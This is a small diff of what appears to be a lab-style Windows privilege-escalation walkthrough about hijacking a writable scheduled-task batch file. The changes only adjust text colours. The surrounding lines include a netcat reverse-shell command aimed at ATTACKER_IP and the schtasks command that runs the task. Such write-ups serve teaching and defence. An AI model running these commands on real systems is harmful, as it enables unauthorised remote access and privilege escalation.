@@ -19,7 +19,7 @@ Run As User:                          taskusr1
 
 <br/>
 
-- The Group <b style={{ color: 'PowderBlue' }}>BUILTIN\\Users:(I)(F)</b> has Full Access on the <span style={{fontWeight: 'Bold'}}>Binary.</span>
+- The Group <b style={{ color: 'DeepSkyBlue' }}>BUILTIN\\Users:(I)(F)</b> has Full Access on the <span style={{fontWeight: 'Bold'}}>Binary.</span>
 
 ```log
 C:\> icacls c:\tasks\schtask.bat
@@ -38,7 +38,7 @@ C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
 
 <br/>
 
-- Starting the <b style={{ color: 'DeepSkyBlue' }}>Task</b>. **(In a Normal case Scenario we would have to Wait for the Task to be Started)**
+- Starting the <b style={{ color: 'MediumTurquoise' }}>Task</b>. **(In a Normal case Scenario we would have to Wait for the Task to be Started)**
 
 ```log
 C:\> schtasks /run /tn vulntask
